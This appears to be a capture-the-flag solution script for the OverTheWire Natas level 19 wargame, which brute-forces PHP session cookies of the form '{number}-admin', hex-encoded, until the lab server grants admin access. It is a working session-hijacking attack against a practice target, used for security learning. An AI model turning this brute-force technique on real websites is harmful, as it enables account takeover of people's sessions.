import string       # For password generation
import requests     # For http requests
from requests.auth import HTTPBasicAuth

# Basic htpp request variables
login = HTTPBasicAuth("natas19", "****") # add your own password :P
url = "http://natas19.natas.labs.overthewire.org/"

# Possible IDs
count = 1
max_ids = 999
c = ""

# While we haven't found the ID...
while count <= max_ids:
    # Create hexadecimal representation of ASCII character
    code = format(count, "03d")        # Represent numbers in xxx format
    code = list(bytes(code, 'ascii')) # Translate to ASCII
    for v in code:
        c += str(hex(v)[2:])        # Translate to hex

    # Our custom cookie
    session = "PHPSESSID=" + c + "2d61646d696e" # PHPSESSID={number}-admin
    cookie = {"Cookie": session}
    response = requests.post(url, headers = cookie, auth = login, verify = False)
    # We got a hit
    if "You are an admin" in response.text:
        print("Found: " + str(count))
        break
    c = ""
    count += 1
